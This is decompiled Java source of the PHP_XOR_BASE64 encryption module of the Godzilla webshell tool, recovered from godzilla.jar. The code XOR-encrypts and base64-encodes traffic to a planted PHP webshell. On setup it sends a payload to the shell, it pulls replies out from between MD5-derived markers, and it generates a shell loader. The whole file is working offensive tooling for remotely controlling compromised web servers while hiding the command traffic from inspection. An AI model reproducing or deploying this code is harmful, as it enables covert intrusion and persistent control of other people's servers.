/*     */ package shells.cryptions.phpXor;
/*     */ 
/*     */ import core.annotation.CryptionAnnotation;
/*     */ import core.imp.Cryption;
/*     */ import core.shell.ShellEntity;
/*     */ import java.net.URLEncoder;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ 
/*     */ @CryptionAnnotation(Name = "PHP_XOR_BASE64", payloadName = "PhpDynamicPayload")
/*     */ public class PhpXor
/*     */   implements Cryption
/*     */ {
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private byte[] key;
/*     */   private boolean state;
/*     */   private String pass;
/*     */   private byte[] payload;
/*     */   private String findStrLeft;
/*     */   private String findStrRight;
/*     */   
/*     */   public void init(ShellEntity context) {
/*  25 */     this.shell = context;
/*  26 */     this.http = this.shell.getHttp();
/*  27 */     this.key = this.shell.getSecretKeyX().getBytes();
/*  28 */     this.pass = this.shell.getPassword();
/*  29 */     String findStrMd5 = functions.md5(this.pass + new String(this.key));
/*  30 */     this.findStrLeft = findStrMd5.substring(0, 16);
/*  31 */     this.findStrRight = findStrMd5.substring(16);
/*     */     try {
/*  33 */       this.payload = this.shell.getPayloadModule().getPayload();
/*  34 */       if (this.payload != null) {
/*  35 */         this.http.sendHttpResponse(this.payload);
/*  36 */         this.state = true;
/*     */       } else {
/*  38 */         Log.error("payload Is Null");
/*     */       }
/*     */     
/*  41 */     } catch (Exception e) {
/*  42 */       Log.error(e);
/*     */       return;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] encode(byte[] data) {
/*     */     try {
/*  51 */       return E(data);
/*  52 */     } catch (Exception e) {
/*  53 */       Log.error(e);
/*  54 */       return null;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] decode(byte[] data) {
/*  61 */     if (data != null && data.length > 0) {
/*     */       try {
/*  63 */         return D(findStr(data));
/*  64 */       } catch (Exception e) {
/*  65 */         Log.error(e);
/*  66 */         return null;
/*     */       } 
/*     */     }
/*  69 */     return data;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean isSendRLData() {
/*  77 */     return true;
/*     */   }
/*     */   
/*     */   public byte[] E(byte[] cs) {
/*  81 */     int len = cs.length;
/*  82 */     for (int i = 0; i < len; i++) {
/*  83 */       cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
/*     */     }
/*  85 */     return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
/*     */   }
/*     */   public byte[] D(String data) {
/*  88 */     byte[] cs = functions.base64Decode(data);
/*  89 */     int len = cs.length;
/*  90 */     for (int i = 0; i < len; i++) {
/*  91 */       cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
/*     */     }
/*  93 */     return cs;
/*     */   }
/*     */   public String findStr(byte[] respResult) {
/*  96 */     String htmlString = new String(respResult);
/*  97 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean check() {
/* 102 */     return this.state;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] generate(String password, String secretKey) {
/* 108 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\phpXor\PhpXor.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */